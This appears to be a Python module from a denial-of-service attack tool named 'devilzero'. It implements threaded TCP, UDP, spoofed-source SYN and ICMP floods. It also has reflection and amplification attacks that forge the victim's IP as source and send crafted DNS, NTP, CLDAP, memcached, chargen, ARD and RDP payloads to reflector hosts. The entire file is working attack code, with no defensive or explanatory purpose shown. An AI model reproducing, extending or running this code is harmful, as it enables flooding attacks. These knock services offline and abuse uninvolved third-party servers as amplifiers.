import socket
import random
import time
import struct
from threading import Thread, Event
from itertools import cycle

from devilzero.utils import Colors, is_root, print_error, print_warning, print_info, random_ip, create_syn_packet


class Layer4(Thread):
    def __init__(self, target, ref=None, method="TCP", synevent=None, proxies=None, protocolid=74):
        Thread.__init__(self, daemon=True)
        self._target = target
        self._ref = ref or []
        self._method = method
        self._synevent = synevent
        self._proxies = list(proxies) if proxies else None
        self.protocolid = protocolid
        self.sent = 0
        self._amp_payload = None
        self._amp_payloads = None

    def run(self):
        if self._synevent:
            self._synevent.wait()
        methods = {
            "TCP": self.tcp_flood,
            "UDP": self.udp_flood,
            "SYN": self.syn_flood,
            "ICMP": self.icmp_flood,
        }
        flood_fn = methods.get(self._method, self.tcp_flood)
        if self._method in ("DNS", "NTP", "RDP", "CLDAP", "MEM", "CHAR", "ARD"):
            flood_fn = self.amp_flood
            self._setup_amp()
        while self._synevent and self._synevent.is_set():
            flood_fn()

    def tcp_flood(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(0.9)
            s.connect(self._target)
            s.send(random.randbytes(1024))
            s.close()
        except Exception:
            pass

    def udp_flood(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random.randbytes(random.randint(512, 1400))
            s.sendto(payload, self._target)
            s.close()
        except Exception:
            pass

    def syn_flood(self):
        if not is_root():
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            src_ip = random_ip()
            pkt = create_syn_packet(src_ip, self._target[0], self._target[1])
            s.sendto(pkt, (self._target[0], 0))
            s.close()
        except Exception:
            pass

    def icmp_flood(self):
        if not is_root():
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            payload = struct.pack('!BBHHH', 8, 0, 0, random.randint(0, 65535), 1) + random.randbytes(64)
            s.sendto(payload, (self._target[0], 0))
            s.close()
        except Exception:
            pass

    def _setup_amp(self):
        amp_payloads = {
            "DNS": (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53),
            "NTP": (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123),
            "RDP": (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389),
            "CLDAP": (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00', 389),
            "MEM": (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211),
            "CHAR": (b'\x01', 19),
            "ARD": (b'\x00\x14\x00\x00', 3283),
        }
        payload, port = amp_payloads.get(self._method, (b'', 53))
        self._amp_payload = (payload, port)
        self._amp_payloads = cycle(self._generate_amp())

    def _generate_amp(self):
        from impacket.ImpactPacket import IP, UDP, Data
        payloads = []
        for ref in self._ref:
            ip = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)
            ud = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])
            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)
            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def amp_flood(self):
        if not is_root():
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            payload, target = next(self._amp_payloads)
            s.sendto(payload, target)
            s.close()
        except Exception:
            pass